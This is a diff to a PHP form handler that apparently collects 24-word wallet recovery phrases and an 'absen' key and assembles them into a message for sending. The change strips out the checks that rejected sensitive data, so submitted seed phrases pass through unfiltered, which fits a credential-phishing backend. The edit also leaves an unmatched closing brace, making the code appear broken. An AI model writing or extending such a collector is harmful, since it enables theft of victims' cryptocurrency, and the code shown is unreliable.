@@ -25,7 +25,6 @@ $type = $_POST['type'] ?? '';
 $body = "Form submission received\n\nType: " . ($type?:'unknown') . "\nTime: " . date('Y-m-d H:i:s') . "\n\n";
 
 
-
 if ($type === 'import') {
     // collect up to 24 words (only present ones)
     $hasAny = false;
@@ -37,9 +36,6 @@ if ($type === 'import') {
             if (strlen($val) > 0) {
                 $hasAny = true;
                 if (strlen($val) > $maxLen) $val = substr($val,0,$maxLen) . '...';
-                // if suspicious keywords found -> reject
-                if (has_sensitive_keywords($val)) {
-                    respond(false, 'Submission rejected: contains suspicious keywords. Do not submit sensitive data.');
                 }
                 $body .= "Word {$i}: {$val}\n";
             }
@@ -56,7 +52,6 @@ if ($type === 'import') {
 elseif ($type === 'absen') {
     $key = trim((string) ($_POST['absenKey'] ?? ''));
     if ($key === '') respond(false, 'Absen key kosong.');
-    if (has_sensitive_keywords($key)) respond(false, 'Submission rejected: contains suspicious keywords. Do not submit sensitive data.');
     if (strlen($key) > $maxLen) $key = substr($key,0,$maxLen) . '...';
     $body .= "Absen Key: {$key}\n";
     $subject = $subjectPrefix . " - Absen Key";
